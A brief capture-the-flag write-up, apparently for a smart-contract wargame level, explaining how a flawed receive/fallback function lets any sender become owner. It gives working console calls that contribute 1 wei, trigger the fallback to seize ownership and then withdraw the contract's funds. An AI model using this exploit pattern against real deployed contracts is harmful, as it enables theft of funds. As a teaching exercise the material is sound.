## 1) Catch:
The poorly implemented fallback function "receive" changes an important logic of the contract
assigning the ownership to the last person who triggered this fallback by doing one this actions: <br>
    a) Calling an non existing function
    b) Calling an existing function without passing required data
    c) Sending ether to the contract without any data

## 2) Solutions.
    a) Wasting too much time and effort depositing 1001 times 0.001 ether each time so the ownership changes.
    b) Triggering the fallback function.

    Approach b) Sending 1wei to the contract will trigger the fallback function.

        await contract.contribute({value: 1}) // Because of the logic of the fallback, the user must contribute first.

        // Here is where the fallback is triggered
        await contract.sendTransaction({
        from: player,
        value: 1
        })

        // Because you are now the owner, this txn will go through.
        await contract.withdraw()